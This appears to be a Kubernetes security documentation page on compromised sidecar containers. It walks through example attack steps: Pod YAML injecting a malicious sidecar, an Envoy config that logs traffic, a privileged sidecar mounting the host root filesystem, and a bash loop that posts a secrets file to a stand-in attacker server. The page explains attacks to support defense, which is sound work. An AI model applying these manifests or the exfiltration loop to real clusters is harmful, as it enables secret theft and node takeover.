---
sidebar_position: 14
title: "Compromised Sidecars"
description: "How attackers exploit insecure or malicious sidecar containers to intercept data, escalate privileges, and persist within Kubernetes clusters."
keywords: [kubernetes security, sidecar containers, sidecar injection, service mesh security, istio security, envoy proxy, data interception, privilege escalation, pod security, container security]
tags: [attack-vector, sidecars, service-mesh, pod-security, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/pod_security/compromised_sidecars_mitigation/
  - /docs/best_practices/cluster_setup_and_hardening/network_security/service_mesh_security/
  - /docs/attack_vectors/privileged_container_escape/
  - /docs/best_practices/cluster_setup_and_hardening/pod_security/pod_security_standards/
---

# Compromised Sidecars

Sidecar containers in Kubernetes extend the functionality of application containers by handling logging, monitoring, proxies, or other supporting services. However, if sidecars are **misconfigured, maliciously injected, or overly privileged**, they can be exploited to intercept sensitive data, gain elevated access, or maintain long-term persistence in the cluster.

---

## Exploitation Steps

### 1. Deploy a Malicious Sidecar

If an attacker gains control over a Pod specification (e.g., through CI/CD poisoning or RBAC misconfig), they can inject a malicious sidecar:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-sidecar
spec:
  containers:
    - name: legitimate-app
      image: secure-app:latest
    - name: malicious-sidecar
      image: attacker/spy-container
      volumeMounts:
        - mountPath: /app-data
          name: shared-volume
  volumes:
    - name: shared-volume
      emptyDir: {}
```

This sidecar has access to the app’s volume and can exfiltrate credentials, logs, or sensitive files.

---

### 2. Intercept and Modify Traffic

Service mesh sidecars like Envoy can be abused to log or alter traffic. For example, a misconfigured Envoy sidecar might write incoming requests to a local file:

```yaml
admin:
  access_log_path: "/dev/stdout"
  profile_path: "/var/lib/envoy/profile"
static_resources:
  listeners:
    - address: "0.0.0.0"
      filter_chains:
        - filters:
            - name: "envoy.http_connection_manager"
              config:
                codec_type: "AUTO"
                access_log:
                  - name: "envoy.file_access_log"
                    config:
                      path: "/data/logs/requests.log"
```

These logs could include JWT tokens, user credentials, and sensitive application data.

---

### 3. Abuse Privileged Sidecars for Host Access

When a sidecar container is deployed with `privileged: true` and mounted to the host, the attacker can interact with the node:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-sidecar
spec:
  containers:
    - name: main-app
      image: secure-app
    - name: sidecar
      image: attacker/root-access
      securityContext:
        privileged: true
      volumeMounts:
        - mountPath: /host
          name: host-volume
  volumes:
    - name: host-volume
      hostPath:
        path: /
        type: Directory
```

Then:

```bash
kubectl exec -it privileged-sidecar -- /bin/sh
ls /host/etc/
```

The sidecar can access host files, potentially leading to full node compromise.

---

### 4. Persist Within the Cluster

Even if the main container is removed, a malicious sidecar may remain active. It can:

- Serve as a **reverse shell**
- Forward traffic to a C2 server
- Periodically **exfiltrate secrets**

Example:

```bash
while true; do cat /data/secrets.txt | curl -X POST -d @- http://attacker-server.com/upload; sleep 60; done
```

Such persistence allows long-term access even after incident response cleans up the primary application.

---

### Result

A compromised or malicious sidecar enables the attacker to:

- Intercept and modify sensitive traffic
- Steal secrets and credentials
- Escalate to the host
- Maintain stealthy persistence in the cluster

---

## Mitigation

➡ [Securing Kubernetes Sidecars](/docs/best_practices/cluster_setup_and_hardening/pod_security/compromised_sidecars_mitigation)
